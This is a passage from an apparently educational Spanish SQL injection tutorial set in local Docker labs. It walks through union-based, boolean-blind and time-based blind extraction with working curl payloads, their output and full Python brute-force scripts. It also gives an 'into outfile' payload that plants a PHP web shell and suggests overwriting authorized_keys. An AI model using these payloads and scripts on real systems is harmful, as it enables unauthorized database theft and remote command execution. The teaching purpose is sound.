tabla.\n\u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; union select NULL,NULL,NULL-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin Nombre: Rol: Ahora podemos sustituir los NULL por cadenas de texto para comprobar en que columnas podemos mostrar datos\n\u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; union select \u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;c\u0026#39;-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin Nombre: b Rol: c Sabemos que podemos ver los datos de las columnas 2 y 3.\nEnumeraciÃ³n bases de datos Para saber que bases de datos existen usaremos el siguiente payload\nunion select NULL,schema_name,NULL from informationschema.schemata-- - Que significa schema_name, information_schema y schemata?, para saberlo vamos a mirar la base de datos del contenedor sql. Para encontrar el identificador del contenedor hay que ejecutar sudo docker ps\n\u0026gt; sudo docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 52e31603f6a9 php:7.4-apache \u0026#34;docker-php-entrypoiâ€¦\u0026#34; 13 hours ago Up 8 minutes 0.0.0.0:80-\u0026gt;80/tcp, :::80-\u0026gt;80/tcp lab1_web_1 d71dbadbe4d0 mysql:5.7 \u0026#34;docker-entrypoint.sâ€¦\u0026#34; 13 hours ago Up 8 minutes 0.0.0.0:3306-\u0026gt;3306/tcp, :::3306-\u0026gt;3306/tcp, 33060/tcp lab1_db_1 Ahora ya tenemos el id y podemos ejecutar una bash en el contenedor, y despuÃ©s entrar a mysql.\n\u0026gt; sudo docker exec -it d71dbadbe4d0 bash bash-4.2# mysql -u root -p Enter password: Si miramos las bases de datos con show databases; vemos que existe una base de datos que es predeterminada llamada information_schema\nmysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | my_database | | mysql | | performance_schema | | sys | +--------------------+ 5 rows in set (0.00 sec) Dentro de la base de datos information_schema existe una tabla entre muchas llamada schemata\nmysql\u0026gt; use information_schema Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; show tables; +---------------------------------------+ | Tables_in_information_schema | +---------------------------------------+ | CHARACTER_SETS | | COLLATIONS | | COLLATION_CHARACTER_SET_APPLICABILITY | | COLUMNS | | .... | | SCHEMATA | | ... | +---------------------------------------+ 61 rows in set (0.00 sec) Y por Ãºltimo dentro de la tabla schemata, concretamente en la columna \u0026lsquo;schema_name\u0026rsquo;\u0026rsquo; estÃ¡n los nombres de las bases de datos.\nmysql\u0026gt; select * from schemata; +--------------+--------------------+----------------------------+------------------------+----------+ | CATALOG_NAME | SCHEMA_NAME | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH | +--------------+--------------------+----------------------------+------------------------+----------+ | def | information_schema | utf8 | utf8_general_ci | NULL | | def | my_database | latin1 | latin1_swedish_ci | NULL | | def | mysql | latin1 | latin1_swedish_ci | NULL | | def | performance_schema | utf8 | utf8_general_ci | NULL | | def | sys | utf8 | utf8_general_ci | NULL | +--------------+--------------------+----------------------------+------------------------+----------+ 5 rows in set (0.00 sec) Si volvemos al payload que tenÃ­amos antes, vemos que lo que estamos diciendo es, que meta la columna \u0026lsquo;schema_name\u0026rsquo; (la cual contiene los nombres de las bases de datos) en la columna numero 2. Despues le decimos con from donde estÃ¡ esa columna, que estÃ¡ en la base de datos \u0026lsquo;information_schema\u0026rsquo; y en la tabla schemata:\nunion select NULL,schema_name,NULL from informationschema.schemata \u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; union select NULL,schema_name,NULL from information_schema.schemata-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin Nombre: information_schema Rol: Nombre: my_database Rol: Nombre: mysql Rol: Nombre: performance_schema Rol: Nombre: sys Rol: En este caso vemos que se aÃ±ade una nueva fila con \u0026lsquo;Nombre: \u0026rsquo; y \u0026lsquo;Rol: \u0026rsquo; Por cada base de datos encontrada, pero esto no siempre va a ser tan fÃ¡cil en algunas webs puede ser que solo nos muestren el primer dato. En estos casos podemos usar delimitadores para que se vayan mostrando las bases de datos como en el siguiente ejemplo\n\u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=\u0026#39; union select NULL,schema_name,NULL from information_schema.schemata limit 0,1-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: information_schema Rol: \u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=\u0026#39; union select NULL,schema_name,NULL from information_schema.schemata limit 2,1-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: mysql Rol: Esto ya empieza a tener muy buena pinta\u0026hellip; tenemos la capacidad de enumerar las bases de datos.\nEnumeraciÃ³n de las tablas Ahora toca enumerar las tablas, el procedimiento es bastante parecido.\nDentro de la base de datos information_schema hay una tabla llamada tables la cual contiene el nombre de todas las tablas.\n+---------------------------------------+ | Tables_in_information_schema | +---------------------------------------+ | CHARACTER_SETS | | COLLATIONS | | COLLATION_CHARACTER_SET_APPLICABILITY | | ... | | TABLES | | ... | +---------------------------------------+ Dentro de la tabla tables hay una columna llamada table_name con el nombre de las tablas, y otra llamada table_schema la cual tiene el nombre de la base de datos a la cual pertenece la tabla. Por ejemplo en la siguiente instrucciÃ³n se muestran las tablas de la base de datos \u0026lsquo;my_database\u0026rsquo;\nmysql\u0026gt; select table_name from tables where table_schema = \u0026#39;my_database\u0026#39; ; +------------+ | table_name | +------------+ | mi_tabla | +------------+ Esto aplicado a la inyecciÃ³n quedaria de la siguiente forma\nunion select NULL,table_name,NULL from information_schema.tables where table_schema = \u0026#39;my_database\u0026#39;-- - \u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; union select NULL,table_name,NULL from information_schema.tables where table_schema = \u0026#39;my_database\u0026#39;-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin Nombre: mi_tabla Rol: Igual que con las bases de datos si es una inyecciÃ³n en la cual solo vemos el primer dato, podemos usar delimitadores, para ir viendo los nombres uno por uno\n\u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=\u0026#39; union select NULL,table_name,NULL from information_schema.tables where table_schema = \u0026#39;my_database\u0026#39; limit 0,1 -- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: mi_tabla Rol: Columnas Una vez tenemos las tablas, tocan las columnas.\nDentro de la base de datos information_schema hay una tabla llamada columns en la cual estÃ¡n los nombres de las columnas\nmysql\u0026gt; show tables; +---------------------------------------+ | Tables_in_information_schema | +---------------------------------------+ | CHARACTER_SETS | | COLLATIONS | | COLLATION_CHARACTER_SET_APPLICABILITY | | COLUMNS | | ... | +---------------------------------------+ 61 rows in set (0.00 sec) De toda esta tabla vamos a usar solo 3 columnas:\ncolumn_name: Contiene el nombre de las columnas table_name: Contiene el nombre de la tabla a la cual pertenece esa columna table_schema: Contiene el nombre de la base de datos a la cual pertenece la columna mysql\u0026gt; select column_name from columns where table_name = \u0026#39;mi_tabla\u0026#39; and table_schema = \u0026#39;my_database\u0026#39;; +-------------+ | column_name | +-------------+ | id | | nombre | | rol | +-------------+ 3 rows in set (0.00 sec) Esto aplicado a la inyecciÃ³n quedarÃ­a de la siguiente forma:\n\u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; union select NULL,column_name,NULL from information_schema.columns where table_name = \u0026#39;mi_tabla\u0026#39; and table_schema = \u0026#39;my_database\u0026#39;-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin Nombre: id Rol: Nombre: nombre Rol: Nombre: rol Rol: Otra vez si solo nos muestra un dato, podemos usar delimitadores para ir viÃ©ndolos poco a poco.\n\u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=\u0026#39; union select NULL,column_name,NULL from information_schema.columns where table_schema = \u0026#39;my_database\u0026#39; and table_name = \u0026#39;mi_tabla\u0026#39;limit 0,1 -- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: id Rol: \u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=\u0026#39; union select NULL,column_name,NULL from information_schema.columns where table_schema = \u0026#39;my_database\u0026#39; and table_name = \u0026#39;mi_tabla\u0026#39;limit 1,1 -- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: nombre Rol: \u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=\u0026#39; union select NULL,column_name,NULL from information_schema.columns where table_schema = \u0026#39;my_database\u0026#39; and table_name = \u0026#39;mi_tabla\u0026#39;limit 2,1 -- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: rol Rol: Data Por Ãºltimo solo nos quedarÃ­a ver el contenido de las columnas que hemos encontrado. La peticiÃ³n ahora es mucho mÃ¡s sencilla. En mysql se verÃ­a asÃ­\nmysql\u0026gt; select nombre from mi_tabla; +--------+ | nombre | +--------+ | Joan | | Quim | | Andreu | +--------+ Y la inyecciÃ³n serÃ­a simplemente la siguiente\ncurl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; union select NULL,nombre,NULL from my_database.mi_tabla-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin Nombre: Joan Rol: Nombre: Quim Rol: Nombre: Andreu Rol: \u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; union select NULL,nombre,rol from my_database.mi_tabla-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin Nombre: Joan Rol: admin Nombre: Quim Rol: user Nombre: Andreu Rol: user En este caso podemos ver el contenido de varias columnas a la vez de forma simple, pero no siempre es asÃ­. Si solo podemos mostrar datos en una columna podemos concatenar datos con \u0026lsquo;group_concat()\u0026rsquo;\ngroup_concat(nombre,\u0026#39;:\u0026#39;,rol) Con esto estaremos mostrando el contenido de la columna nombre y de la columna rol en la misma columna.\n\u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; union select NULL,group_concat(nombre,\u0026#39;:\u0026#39;,rol) ,NULL from my_database.mi_tabla-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin Nombre: Joan:admin,Quim:user,Andreu:user Rol: Si solo nos muestra el primer dato podemos usar delimitadores para ir mostrÃ¡ndolos poco a poco\n\u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=\u0026#39; union select NULL,nombre,rol from my_database.mi_tabla limit 0,1 -- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin \u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=\u0026#39; union select NULL,nombre,rol from my_database.mi_tabla limit 1,1 -- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Quim Rol: user \u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=\u0026#39; union select NULL,nombre,rol from my_database.mi_tabla limit 2,1 -- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Andreu Rol: user Subida de archivos Aparte de sacar informaciÃ³n de la base de datos tambiÃ©n podemos probar de escribir archivos. Esto lo haremos poniendo el contenido que queremos meter en el archivo en una columna y luego lo redirigiremos con \u0026lsquo;into outfile\u0026rsquo; al \u0026lsquo;/tmp/sqli\u0026rsquo;\n?nombre=joan\u0026#39; union select NULL,\u0026#34;holaaaaaa\u0026#34;,NULL into outfile \u0026#34;/tmp/sqli\u0026#34;-- - Para comprobar si ha funcionado vamos a abrir una terminal con el contendor. Primero buscaremos el id del contenedor\n\u0026gt; sudo docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES c4b17fc1716b php:7.4-apache \u0026#34;docker-php-entrypoiâ€¦\u0026#34; 13 seconds ago Up 12 seconds 0.0.0.0:80-\u0026gt;80/tcp, :::80-\u0026gt;80/tcp lab1_web_1 5f7d54a374b0 mysql:5.7 \u0026#34;docker-entrypoint.sâ€¦\u0026#34; 13 seconds ago Up 12 seconds 0.0.0.0:3306-\u0026gt;3306/tcp, :::3306-\u0026gt;3306/tcp, 33060/tcp lab1_db_1 DespuÃ©s ejecutaremos una bash en el contenedor mysql\n\u0026gt; sudo docker exec -it 5f7d54a374b0 bash bash-4.2# ls bin dev\tentrypoint.sh home lib64 mnt proc run srv tmp var boot docker-entrypoint-initdb.d etc\tlib media opt root sbin sys usr Por Ãºltimo, comprobamos:\nbash-4.2# ls /tmp a sqli testing_sqli bash-4.2# cat /tmp/sqli 1\tJoan\tadmin \\N\tholaaaaaa\t\\N Â¿De quÃ© nos sirve esto?\nPodemos usar esta tÃ©cnica para por ejemplo modificar el authorized_keys de un usuario del sistema para poder entrar sin proporcionar contraseÃ±a. El authorized_keys por defecto estÃ¡ en \u0026lsquo;/home/(user)/.ssh/authorized_keys\u0026rsquo;\nTambiÃ©n lo podemos usar para crear un nuevo archivo php en la web con cÃ³digo malicioso el cual nos permita ejecutar comandos.\n\u0026#39; union select NULL,\u0026#34;\u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]);\u0026#34;,NULL into outfile \u0026#34;/var/www/html/cmd.php\u0026#34;-- - Esto bÃ¡sicamente lo que hace es crear un archivo en /var/www/html que es la ruta por defecto para las webs. El archivo que crea le mete codigo php el cual hace que todo lo que reciba por GET, por el parÃ¡metro cmd (localhost/cmd.php?cmd=) lo ejecutara con la funciÃ³n system. Lo que permitirÃ¡ tener una ejecuciÃ³n remota de comandos.\nEn el laboratorio 1 no se puede probar, ya que la web y la base de datos estÃ¡n en contenedores distintos.\nBooleana Laboratorio\nPara la explicaciÃ³n se va a usar el laboratorio 3:\nDescarga el laboratorio\nDescomprÃ­melo y entra a la carpeta\nunzip lab3.zip cd lab3 Despliega el contenedor\ndocker-compose up --build En este tipo de inyecciones no vamos a ver el output de las querys maliciosas.\nEmpezamos mandando una peticiÃ³n normal, y al final le ponemos algo que sea True como por ejemplo (1=1, a=a, \u0026lsquo;a\u0026rsquo;=\u0026lsquo;a\u0026rsquo;), mirando las respuestas podemos ver que cuando la solicitud es correcta vemos el Nombre y el Rol, pero cuando la peticiÃ³n es incorrecta no sale ni el Nombre ni el Rol\ncurl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; and 1=1 -- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; and 1=2 -- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Esto dependiendo de la web puede cambiar lo que se muestra o se deja de mostrar, a veces pueden ser detalles muy pequeÃ±os\nPara sacar informaciÃ³n con este mÃ©todo podemos hacer una peticiÃ³n diciendo que el primer carÃ¡cter de el primer base de datos es una \u0026rsquo;m\u0026rsquo;, en el caso de que la afirmaciÃ³n sea cierta veremos el Nombre y el Rol, de caso contrario que no acertemos el caracter no nos saldrÃ¡ nada.\ncurl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; and substr((select schema_name from information_schema.schemata limit 1,1),1,1)=\u0026#39;m\u0026#39;-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; and substr((select schema_name from information_schema.schemata limit 1,1),1,1)=\u0026#39;a\u0026#39;-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; De forma manual tardarÃ­amos una eternidad en sacar la informaciÃ³n de la base de datos asÃ­ que podemos automatizarlo con python\nBase de datos Para enumerar las bases de datos vamos a usar el siguiente payload\njoan\u0026#39; and substr((select schema_name from information_schema.schemata limit 1,1),1,1)=\u0026#39;m\u0026#39;-- - En el script declaramos una variable llamada mensaje la cual contiene el mensaje que devuelve la web cuando la query sql es correcta, cada vez que el script lanze una peticiÃ³n comprobara si en la respuesta estÃ¡ este mensaje. DespuÃ©s calculamos la cantidad de bases de datos. Por Ãºltimo se calcula el \u0026ldquo;Length\u0026rdquo; de cada nombre de la base de datos y se hace fuerza bruta para sacar cada caracter.\nfrom pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; mensaje = \u0026#34;Nombre: Joan\u0026#34; def database(url,characters,mensaje): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Bases de datos\u0026#34;) database = \u0026#34;\u0026#34; for i in range(100): payload = \u0026#34;{} and (select count(schema_name) from information_schema.schemata)={}-- -\u0026#34;.format(url,i) r = requests.get(payload) if mensaje in r.text: dbs = i break for db in range(dbs): for i in range(100): payload = \u0026#34;{} and LENGTH((select schema_name from information_schema.schemata limit {}, 1))={}-- -\u0026#34;.format(url, db, i) r = requests.get(payload) if mensaje in r.text: db_length = i + 1 break database += \u0026#34;\\n[*] \u0026#34; for position in range(db_length): for char in characters: p1.status(char) payload = \u0026#34;{} and substr((select schema_name from information_schema.schemata limit {},1),{},1)=\u0026#39;{}\u0026#39;-- -\u0026#34;.format(url, db, position, char) r = requests.get(payload) if mensaje in r.text: database += char p2.status(database) break database(url,characters,mensaje) Tablas from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; mensaje = \u0026#34;Nombre: Joan\u0026#34; def tables(url,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Tablas\u0026#34;) tables = \u0026#34;\u0026#34; for i in range(100): payload = \u0026#34;{} and (select count(table_name) from information_schema.tables where table_schema = \u0026#39;my_database\u0026#39;)={}-- -\u0026#34;.format(url,i) r = requests.get(payload) if mensaje in r.text: tbs = i break for tb in range(tbs): for i in range(100): payload = \u0026#34;{} and LENGTH((select table_name from information_schema.tables where table_schema = \u0026#39;my_database\u0026#39; limit {}, 1))={}-- -\u0026#34;.format(url, tb, i) r = requests.get(payload) if mensaje in r.text: tb_length = i + 1 break tables += \u0026#34;\\n[*] \u0026#34; for position in range(tb_length): for char in characters: p1.status(char) payload = \u0026#34;{} and substr((select table_name from information_schema.tables where table_schema = \u0026#39;my_database\u0026#39; limit {},1),{},1)=\u0026#39;{}\u0026#39;-- -\u0026#34;.format(url, tb, position, char) r = requests.get(payload) if mensaje in r.text: tables += char p2.status(tables) break tables(url,characters) Columnas from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; mensaje = \u0026#34;Nombre: Joan\u0026#34; def columns(url,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Columnas\u0026#34;) columns = \u0026#34;\u0026#34; for i in range(100): payload = \u0026#34;{} and (select count(column_name) from information_schema.columns where table_schema = \u0026#39;my_database\u0026#39; and table_name = \u0026#39;mi_tabla\u0026#39;)={}-- -\u0026#34;.format(url,i) r = requests.get(payload) if mensaje in r.text: cols = i break for col in range(cols): for i in range(100): payload = \u0026#34;{} and LENGTH((select column_name from information_schema.columns where table_schema = \u0026#39;my_database\u0026#39; and table_name = \u0026#39;mi_tabla\u0026#39; limit {}, 1))={}-- -\u0026#34;.format(url, col, i) r = requests.get(payload) if mensaje in r.text: col_length = i + 1 break columns += \u0026#34;\\n[*] \u0026#34; for position in range(col_length): for char in characters: p1.status(char) payload = \u0026#34;{} and substr((select column_name from information_schema.columns where table_schema = \u0026#39;my_database\u0026#39; and table_name = \u0026#39;mi_tabla\u0026#39; limit {},1),{},1)=\u0026#39;{}\u0026#39;-- -\u0026#34;.format(url, col, position, char) r = requests.get(payload) if mensaje in r.text: columns += char p2.status(columns) break columns(url,characters) Data from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; + \u0026#34;:\u0026#34; mensaje = \u0026#34;Nombre: Joan\u0026#34; def data(url,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Datos\u0026#34;) datos = \u0026#34;\u0026#34; for i in range(100): payload = \u0026#34;{} and (select count(nombre) from my_database.mi_tabla)={}-- -\u0026#34;.format(url,i) r = requests.get(payload) if mensaje in r.text: dts = i break for dt in range(dts): for i in range(100): payload = \u0026#34;{} and LENGTH((select nombre from my_database.mi_tabla limit {}, 1))={}-- -\u0026#34;.format(url, dt, i) r = requests.get(payload) if mensaje in r.text: dt_length = i + 1 break datos += \u0026#34;\\n[*] \u0026#34; for position in range(dt_length): for char in characters: p1.status(char) payload = \u0026#34;{} and substr((select nombre from my_database.mi_tabla limit {},1),{},1)=\u0026#39;{}\u0026#39;-- -\u0026#34;.format(url, dt, position, char) r = requests.get(payload) if mensaje in r.text: datos += char p2.status(datos) break data(url,characters) Mas informaciÃ³n relevante version() [VersiÃ³n Base de datos]\rSELECT version(); from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; + \u0026#34;:\u0026#34; mensaje = \u0026#34;Nombre: Joan\u0026#34; def version(url,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Datos\u0026#34;) versions = \u0026#34;\u0026#34; for v in range(1): for i in range(100): payload = \u0026#34;{} and LENGTH((select version() limit {}, 1))={}-- -\u0026#34;.format(url, v, i) r = requests.get(payload) if mensaje in r.text: v_length = i + 1 break versions += \u0026#34;\\n[*] \u0026#34; for position in range(v_length): for char in characters: p1.status(char) payload = \u0026#34;{} and substr((select version() limit {},1),{},1)=\u0026#39;{}\u0026#39;-- -\u0026#34;.format(url, v, position, char) r = requests.get(payload) if mensaje in r.text: versions += char p2.status(versions) break version(url,characters) user() [Usuario que ejecuta la base de datos]\rSELECT user(); \u0026gt; python3 main.py [\u0026gt;] Probando con: 3 [*] Usuario: [*] root@172.19.0.3 from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; + \u0026#34;:\u0026#34; mensaje = \u0026#34;Nombre: Joan\u0026#34; def user(url,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Usuario\u0026#34;) users = \u0026#34;\u0026#34; for user in range(1): for i in range(100): payload = \u0026#34;{} and LENGTH((select user() limit {}, 1))={}-- -\u0026#34;.format(url, user, i) r = requests.get(payload) if mensaje in r.text: v_length = i + 1 break users += \u0026#34;\\n[*] \u0026#34; for position in range(v_length): for char in characters: p1.status(char) payload = \u0026#34;{} and substr((select user() limit {},1),{},1)=\u0026#39;{}\u0026#39;-- -\u0026#34;.format(url, user, position, char) r = requests.get(payload) if mensaje in r.text: users += char p2.status(users) break user(url,characters) database() [Base de datos en uso]\rSELECT database(); \u0026gt; python3 main.py [-] Probando con: e [ ] Base de datos en uso: [*] my_database from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; + \u0026#34;:\u0026#34; mensaje = \u0026#34;Nombre: Joan\u0026#34; def user(url,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Base de datos en uso\u0026#34;) databases = \u0026#34;\u0026#34; for db in range(1): for i in range(100): payload = \u0026#34;{} and LENGTH((select database() limit {}, 1))={}-- -\u0026#34;.format(url, db, i) r = requests.get(payload) if mensaje in r.text: db_length = i + 1 break databases += \u0026#34;\\n[*] \u0026#34; for position in range(db_length): for char in characters: p1.status(char) payload = \u0026#34;{} and substr((select database() limit {},1),{},1)=\u0026#39;{}\u0026#39;-- -\u0026#34;.format(url, db, position, char) r = requests.get(payload) if mensaje in r.text: databases += char p2.status(databases) break user(url,characters) Basada en tiempo a ciegas Laboratorio\nPara la explicaciÃ³n se va a usar el laboratorio 3:\nDescarga el laboratorio\nDescomprÃ­melo y entra a la carpeta\nunzip lab3.zip cd lab3 Despliega el contenedor\ndocker-compose up --build En estas inyecciones no vamos a estar viendo el output, asÃ­ que vamos a jugar con los tiempos de carga del servidor\nEmpezamos mandando una peticiÃ³n en la cual le decimos a la base de datos que se espere 5 segundos, Para saber si la inyecciÃ³n funciona, vamos a usar el comando time el cual nos dirÃ¡ cuanto ha tardado\n\u0026gt; time curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; and sleep(5) -- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; real\t5.03s Ha tardado 5.03 segundos lo que significa que aparentemente ha funcionado la inyecciÃ³n\nBase de datos Para enumerar las bases de datos vamos a usar el siguiente payload\njoan\u0026#39; and if(substr((select schema_name from information_schema.schemata limit 1,1),1,1)=\u0026#39;a\u0026#39;,sleep(5),1)-- - Â¿QuÃ© estamos haciendo con esto?\nLe estamos diciendo que \u0026ldquo;si el nombre de la primera base de datos empieza por \u0026lsquo;a\u0026rsquo;, quÃ©date esperando 5 segundos\u0026rdquo;\nEsto no tardarÃ¡ 5 segundos, ya que no empieza por a, pero con la m si se queda colgado.\n\u0026gt; time curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; and if(substr((select schema_name from information_schema.schemata limit 1,1),1,1)=\u0026#39;a\u0026#39;,sleep(5),1)-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin real\t0.01s \u0026gt; time curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; and if(substr((select schema_name from information_schema.schemata limit 1,1),1,1)=\u0026#39;m\u0026#39;,sleep(5),1)-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; real\t5.02s Si lo hacemos manualmente vamos a tardar mucho, asÃ­ que podemos hacer un script en python que lo automatice\nfrom pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; sleep_time = 0.05 characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; def database(url,sleep_time,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Bases de datos\u0026#34;) database = \u0026#34;\u0026#34; for i in range(100): payload = \u0026#34;{} and if((select count(schema_name) from information_schema.schemata)={}, sleep({}), 1)-- -\u0026#34;.format(url,i,sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: dbs = i break for db in range(dbs): for i in range(100): payload = \u0026#34;{} and if(LENGTH((select schema_name from information_schema.schemata limit {}, 1))={}, sleep({}), 1)-- -\u0026#34;.format(url, db, i, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: db_length = i + 1 break database += \u0026#34;\\n[*] \u0026#34; for position in range(db_length): for char in characters: p1.status(char) payload = \u0026#34;{} and if(substr((select schema_name from information_schema.schemata limit {},1),{},1)=\u0026#39;{}\u0026#39;,sleep({}),1)-- -\u0026#34;.format(url, db, position, char, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: database += char p2.status(database) break database(url,sleep_time,characters) Tables from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; sleep_time = 0.05 characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + 